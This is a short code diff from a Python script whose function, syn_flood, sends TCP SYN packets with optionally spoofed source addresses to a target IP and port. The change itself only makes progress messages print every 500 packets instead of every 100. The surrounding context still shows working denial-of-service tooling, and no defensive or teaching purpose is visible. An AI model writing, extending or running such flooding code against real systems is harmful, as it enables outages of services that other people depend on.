@@ -44,7 +44,7 @@ def syn_flood(target_ip, target_port, num_packets, spoof_ip=True, send_rate=0.01
         
         send(packet, verbose=False, inter=send_rate) # inter is time between packets
         
-        if (i + 1) % 100 == 0:
+        if (i + 1) % 500 == 0:
             print(f"[+] Sent {i + 1}/{num_packets} packets...")
 
     print(f"\n[+] TCP SYN Flood complete. Sent {num_packets} packets to {target_ip}:{target_port}.")
